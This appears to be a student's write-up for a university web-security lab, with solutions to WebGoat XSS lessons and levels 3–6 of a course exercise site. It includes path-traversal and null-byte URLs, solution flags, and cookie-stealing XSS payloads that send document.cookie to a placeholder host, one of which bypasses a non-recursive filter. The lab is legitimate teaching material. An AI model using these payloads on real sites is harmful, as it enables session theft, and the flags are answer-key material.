# Assignment 4

* Do the following lessons in WebGoat (you do not have to submit any notes regarding these exercises to blackboard):

	* Cross-Site Scripting (XSS) - Stored XSS attacks

		* ![StoredXSS1](img/stored_xss_1.PNG)
		* ![StoredXSS2](img/stored_xss_2.PNG)

	* Cross-Site Scripting (XSS) - Reflected XSS attacks

		* ![ReflectedXSS](img/reflected_xss.PNG)	

* Do the following four exercises on http://websecurity.cs.ru.nl/
	
	* Level 3

		* http://websecurity.cs.ru.nl/?level=3&nieuws=admin/index.php
		* Solution: YTgwZWM1NDg2

	* Level 4
		* http://websecurity.cs.ru.nl/?level=4&nieuws=admin/index.php%00
		* The appended string "%00" represents the nullbyte (\0) and forces php to ignore every appended string behind it
		* See also: http://stackoverflow.com/questions/12731547/can-an-appended-file-suffix-to-a-parameter-for-file-get-contents-be-bypassed
		* Solution: ZjQ5ZmVlOTZm

	* Level 5

		* Use your own host and the cookie stealer script provided on the websec website.
		* In the searchterm field enter: ``` <script>document.location="http://yourhoster.com/stealer.php?cookie="+document.cookie</script>```
		* Click on the search button and use Webscarab to get the resulting url to the search term.
		* Go to the contact site and enter the before mentioned url you created with your malicious code.
		* Solution: NzM2MGUzMWJh

	* Level 6
		
		* Nearly the same approach as Level 5 but this time greater than and less than symbols are getting filtered. There is no recursive filtering though.
		* We can therefore use a snippet like this for the searchterm: ``` <scr<script>ipt>document.location="http://yourhoster.com/stealer.php?cookie="+document.cookie</scr</script>ipt> ```
		* See also: https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)#Example_5:_Bypassing_non-recursive_filtering
		* Solution: NDY3YjMwZjRl

